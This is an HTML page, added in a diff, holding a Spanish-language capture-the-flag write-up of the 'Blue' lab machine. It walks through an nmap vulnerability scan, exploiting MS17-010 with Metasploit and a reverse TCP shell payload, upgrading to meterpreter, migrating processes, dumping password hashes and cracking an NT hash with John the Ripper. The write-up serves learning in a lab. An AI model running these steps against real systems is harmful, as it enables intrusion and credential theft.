@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blue Report</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #0047ab;
+        }
+
+        h2 {
+            color: #0081ab;
+        }
+
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+            
+        }
+
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+    </style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1># BLUE</h1>
+
+        <h2>NMAP</h2>
+        <div class="">
+            <img src="image-1.png" alt="NMAP Scan">
+            <img src="image.png" alt="NMAP Scan">
+            <img src="image-2.png" alt="NMAP Result">
+        </div>
+        <p>Buscamos vulnerabilidades</p>
+        <pre>
+            <code>nmap -sV -sC --script vuln 10.10.141.85</code>
+        </pre>
+
+        <h2>Metasploit</h2>
+
+        <p>Buscamos la vulnerabilidad anterior</p>
+        <pre>
+            <code>search ms17-010</code>
+        </pre>
+        
+        <img src="image-3.png" alt="Metasploit Search Result">
+
+        <p>Establecemos <code>RHOSTS</code> y añadimos un payload</p>
+        <pre>
+            <code>set payload windows/x64/shell/reverse_tcp</code>
+        </pre>
+        <p>Ejecutamos el exploit y tendremos una shell, salimos con <code>CTRL + Z</code></p>
+        <p>Buscamos un módulo que permita cambiar de shell a meterpreter</p>
+        
+        <pre>
+            <code>search shell_to_meterpreter</code>
+        </pre>
+        
+        <img src="image-5.png" alt="Metasploit Module Search Result">
+        
+        <p>Ejecutamos con <code>run</code> y tendremos 2 sesiones iniciadas</p>
+        
+        <img src="image-6.png" alt="Metasploit Session">
+        
+        <p>Listamos todos los procesos corriendo con <code>ps</code></p>
+
+        <img src="image-7.png" alt="Metasploit Process List">
+
+        <p>Tendremos que migrar a un proceso, en este caso <code>1540</code></p>
+        <pre>
+            <code>migrate 1540</code>
+        </pre>
+
+        <p>Usamos el comando <code>hashdump</code>, para ver los hashes de las contraseñas</p>
+
+        <img src="image-8.png" alt="Hashdump Result">
+        
+        
+        <p>Pasamos el hash a un txt y lo rompemos</p>
+        <pre>
+            <code>echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt</code>
+            <code>john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>
+        </pre>
+        
+        <h2>Flags</h2>
+        <p>En <code>C:</code> encontraremos la primera flag</p>
+
+        <img src="image-10.png" alt="Flag 1">
+        
+        <p>En <code>c:\Windows\System32\Config</code> encontramos la segunda flag</p>
+
+        <img src="image-11.png" alt="Flag 2">
+
+        <p>Dentro de los documentos de Jon encontramos la tercera flag</p>
+
+        <img src="image-12.png" alt="Flag 3">
+        
+    </div>
+</body>
+</html>
